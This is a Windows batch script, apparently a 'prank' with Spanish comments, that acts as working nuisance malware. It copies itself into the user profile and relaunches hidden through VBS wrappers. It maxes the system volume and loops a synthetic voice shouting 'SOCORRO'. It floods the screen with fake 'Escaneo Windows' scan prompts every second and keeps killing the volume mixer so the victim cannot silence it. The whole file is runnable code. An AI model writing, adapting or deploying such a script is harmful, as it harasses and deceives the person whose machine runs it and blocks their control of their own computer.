md %userprofile%\bromita
copy LaEnfermedad.bat %userprofile%\bromita
IF EXIST %userprofile%\bromita\oculto.vbs goto in
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\LaEnfermedad.bat", 0, True >%userprofile%\bromita\oculto.vbs
start %userprofile%\bromita\oculto.vbs
exit
:in
rem Subir volumen al maximo
echo set oShell = CreateObject("WScript.Shell") > %userprofile%\bromita\volumenmaximo.vbs
echo oShell.run"%SystemRoot%\System32\SndVol.exe" >> %userprofile%\bromita\volumenmaximo.vbs
echo WScript.Sleep 1500 'Waits For The Program To Open >> %userprofile%\bromita\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\bromita\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\bromita\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\bromita\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\bromita\volumenmaximo.vbs
echo oShell.SendKeys("{PGUP}") >> %userprofile%\bromita\volumenmaximo.vbs
rem Creacion de las voces
echo Option Explicit > %userprofile%\bromita\voice.vbs 
echo Dim David >> %userprofile%\bromita\voice.vbs 
echo 'David's Voice >> %userprofile%\bromita\voice.vbs 
echo Set David = CreateObject("SAPI.spVoice") >> %userprofile%\bromita\voice.vbs 
echo Set David.Voice = David.GetVoices.Item(0) >> %userprofile%\bromita\voice.vbs 
echo David.Rate = 2 >> %userprofile%\bromita\voice.vbs 
echo David.Volume = 100 >> %userprofile%\bromita\voice.vbs 
echo David.Speak "SOCORRO" >> %userprofile%\bromita\voice.vbs
rem BUCLE VOCES.bat
echo :invoice > %userprofile%\bromita\buclevoicebat.bat
echo start %userprofile%\bromita\voice.vbs >> %userprofile%\bromita\buclevoicebat.bat
echo timeout 2 %userprofile%\bromita\voice.vbs >> %userprofile%\bromita\buclevoicebat.bat
echo goto invoice >> %userprofile%\bromita\buclevoicebat.bat
rem BUCLE voices.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\buclevoicebat.bat", 0, True > %userprofile%\bromita\ocultobuclevoice.vbs
rem ALERTA DE AVISOS avisos.vbs 
echo X=MsgBox("Quieres escanear el ordenador?",3+48,"Escaneo Windows") > %userprofile%\bromita\avisos.vbs 
rem bucle.bat de avisos.vbs
echo :in  > %userprofile%\bromita\bucle.bat 
echo start %userprofile%\bromita\avisos.vbs  >> %userprofile%\bromita\bucle.bat
echo timeout 1  >> %userprofile%\bromita\bucle.bat 
echo goto :in  >> %userprofile%\bromita\bucle.bat 
rem BUCLE VBS DE AVISOS ocultobucle.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\bucle.bat", 0, True > %userprofile%\bromita\ocultobucle.vbs
rem BUCLE DE TASKKILL buclekill.bat
echo :in > %userprofile%\bromita\buclekill.bat
echo taskkill /im SndVol.exe >> %userprofile%\bromita\buclekill.bat
echo goto :in >> %userprofile%\bromita\buclekill.bat
rem VBS DE BUCLEKILL ocultobuclekill.vbs
echo CreateObject("Wscript.Shell").Run "%userprofile%\bromita\buclekill.bat", 0, True > %userprofile%\bromita\ocultobuclekill.vbs
rem Iniciar programas
start %userprofile%\bromita\volumenmaximo.vbs
timeout 3
start %userprofile%\bromita\ocultobuclekill.vbs
start %userprofile%\bromita\voice.vbs
start %userprofile%\bromita\ocultobucle.vbs
start %userprofile%\bromita\ocultobuclevoice.vbs
